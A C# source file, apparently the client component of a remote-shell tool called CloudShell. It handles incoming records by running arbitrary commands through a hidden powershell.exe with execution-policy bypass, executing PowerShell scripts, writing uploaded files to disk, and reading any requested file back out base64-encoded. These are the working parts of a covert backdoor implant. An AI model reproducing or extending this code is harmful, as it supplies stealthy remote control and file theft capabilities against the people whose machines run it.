using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Threading;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.IO;

namespace CloudShell__Client
{
    class Shell
    {
        private static Shell instance;
        private Runspace runspace;
        private Shell()
        {
            runspace = RunspaceFactory.CreateRunspace();
            runspace.ApartmentState = ApartmentState.STA;
            runspace.Open();   
        }

        public static Shell Instance
        {
            get
            {
                if (instance == null)
                {
                    instance = new Shell();
                }
                return instance;
            }
        }

        public Record ProcessRecord(Record r)
        {
            Record result = new Record();
            switch(r.Type)
            {
                case RecordType.Command:
                    result.Type = RecordType.CommandResult;
                    result.Content = ProcessCommand(r.Content);
                    result.Guid = r.Guid;
                    break;

                case RecordType.LoadScript:
                    result.Type = RecordType.LoadScriptResult;
                    result.Content = ProcessLoadScript(r.Content);
                    result.Guid = r.Guid;
                    break;

                case RecordType.UploadFile:
                    result.Type = RecordType.UploadFileResult;
                    result.Content = ProcessUploadFile(r.Content);
                    result.Guid = r.Guid; 
                    break;

                case RecordType.DownloadFile:
                    result.Type = RecordType.DownloadFileResult;
                    result.Content = ProcessDownloadFile(r.Content);
                    result.Guid = r.Guid;
                    break;
            };

            return result;
        }

        private string ProcessLoadScript(string script)
        {
            string output = "";

            PowerShell ps = PowerShell.Create();
            ps.Runspace = runspace;

            ps = ps.AddScript(script);
            foreach (PSObject result in ps.Invoke())
            {
                output += result.ToString();
            }

            return output;
        }
        private string ProcessCommand(string command)
        {

            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "powershell.exe",
                Arguments = "-exec bypass -win Hidden " + command,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            if (output.Length == 0)
            {
                output = process.StandardError.ReadToEnd();
            }
            process.WaitForExit();

            return output;
        }

        private string ProcessUploadFile(string content)
        {
            var args = content.Split(':');
            string filename = args[0];
            byte[] data = Record.Base64Decode_b(args[1]);

            File.WriteAllBytes(AppDomain.CurrentDomain.BaseDirectory + filename, data);

            return "File uploaded: " + filename;
        }

        private string ProcessDownloadFile(string filename)
        {
            string rel_filename = filename.Split('\\')[filename.Split('\\').Length - 1];
            return rel_filename + ":" + Record.Base64Encode_b(File.ReadAllBytes(filename));
        }
    }
}
